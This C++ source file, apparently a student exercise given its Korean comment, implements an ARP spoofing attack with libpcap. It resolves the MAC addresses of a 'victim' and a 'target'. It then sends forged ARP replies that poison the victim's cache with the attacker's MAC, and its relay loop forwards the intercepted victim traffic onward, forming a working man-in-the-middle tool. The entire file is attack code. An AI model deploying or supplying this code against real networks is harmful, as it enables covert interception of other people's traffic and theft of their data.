#include "arp.h"

void arp::set_req(int is_target)
{
    Eth *eth_h = (Eth *)(req);
    Arp *arp_h = (Arp *)(req + 14);

    // ARP REQUEST 패킷을 만들어서 10.2의 맥주소 (BB:BB) 얻어오기
    memset(eth_h->dmac, 0xFF, 6);
    memcpy(eth_h->smac, my_mac, 6);
    eth_h->type = htons(0x0806);

    arp_h->htype = htons(0x0001);
    arp_h->ptype = htons(0x0800);
    arp_h->hlen = 0x06;
    arp_h->plen = 0x04;
    arp_h->oper = htons(0x0001); // REQ
    memcpy(arp_h->smac, my_mac, 6);
    memcpy(arp_h->sip, my_ip, 4);
    memset(arp_h->dmac, 0x00, 6);
    if(is_target)
    {
        memcpy(arp_h->dip, target_ip, 4);
    }
    else
    {
        memcpy(arp_h->dip, victim_ip, 4);
    }
}

void arp::send_req(int is_target)
{
    if (pcap_sendpacket(handle, req, 42) != 0)
    {
        printf("error\n");
    }

    printf("send arp request\n");

    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == -1 || res == -2)
            break;

        Eth *eth_h = (Eth *)(packet);

        if (ntohs(eth_h->type) != 0x0806)
            continue;

        Arp *arp_h = (Arp *)(packet + 14);

        if (ntohs(arp_h->oper) != 0x0002)
            continue;

        if(is_target)
        {
            memcpy(target_mac, arp_h->smac, 6);

            printf("target mac = %02X:%02X:%02X:%02X:%02X:%02X\n",
                   target_mac[0], target_mac[1], target_mac[2],
                    target_mac[3], target_mac[4], target_mac[5]);
        }
        else
        {
            memcpy(victim_mac, arp_h->smac, 6);

            printf("victim mac = %02X:%02X:%02X:%02X:%02X:%02X\n",
                   victim_mac[0], victim_mac[1], victim_mac[2],
                    victim_mac[3], victim_mac[4], victim_mac[5]);
        }
        break;
    }

}


void arp::set_att()
{
    Eth *eth_h = (Eth *)(att);
    Arp *arp_h = (Arp *)(att + 14);

    memcpy(eth_h->dmac, victim_mac, 6);
    memcpy(eth_h->smac, my_mac, 6);
    eth_h->type = htons(0x0806);

    arp_h->htype = htons(0x0001);
    arp_h->ptype = htons(0x0800);
    arp_h->hlen = 0x06;
    arp_h->plen = 0x04;
    arp_h->oper = htons(0x0002);

    memcpy(arp_h->smac, my_mac, 6);
    memcpy(arp_h->sip, target_ip, 4);
    memcpy(arp_h->dmac, victim_mac, 6);
    memcpy(arp_h->dip, victim_ip, 4);

}

void arp::send_att()
{
    for (int i = 0; i < 10; i++)
    {
        if (pcap_sendpacket(handle, att, 42) != 0)
        {
            printf("error\n");
        }

        printf("send arp reply\n");
        sleep(1);
    }

}

void arp::relay()
{
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == -1 || res == -2)
            break;

        Eth *eth_h = (Eth *)(packet);

        if (memcmp(eth_h->smac,victim_mac, 6) || memcmp(eth_h->dmac, my_mac, 6) || ntohs(eth_h->type) == 0x0806)
            continue;

        memcpy(eth_h->smac, my_mac, 6);
        memcpy(eth_h->dmac, target_mac, 6);

        if (pcap_sendpacket(handle, packet, header->caplen) != 0)
        {
            printf("error\n");
        }


    }

}


void get_my_info(char *dev, uint8_t *ip, uint8_t *mac)
{

    /*        Get my IP Address      */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    memcpy(ip, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);

    close(fd);

    /*************************************************************************************************/

    /*        Get my Mac Address      */

    int mib[6];
    size_t len;
    char *buf;
    unsigned char *ptr;
    struct if_msghdr *ifm;
    struct sockaddr_dl *sdl;

    mib[0] = CTL_NET;
    mib[1] = AF_ROUTE;
    mib[2] = 0;
    mib[3] = AF_LINK;
    mib[4] = NET_RT_IFLIST;
    if ((mib[5] = if_nametoindex(dev)) == 0)
    {
        perror("if_nametoindex error");
        exit(2);
    }

    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0)
    {
        perror("sysctl 1 error");
        exit(3);
    }

    if ((buf = (char *)malloc(len)) == NULL)
    {
        perror("malloc error");
        exit(4);
    }

    if (sysctl(mib, 6, buf, &len, NULL, 0) < 0)
    {
        perror("sysctl 2 error");
        exit(5);
    }

    ifm = (struct if_msghdr *)buf;
    sdl = (struct sockaddr_dl *)(ifm + 1);
    ptr = (unsigned char *)LLADDR(sdl);

    memcpy(mac, ptr, 6);
}
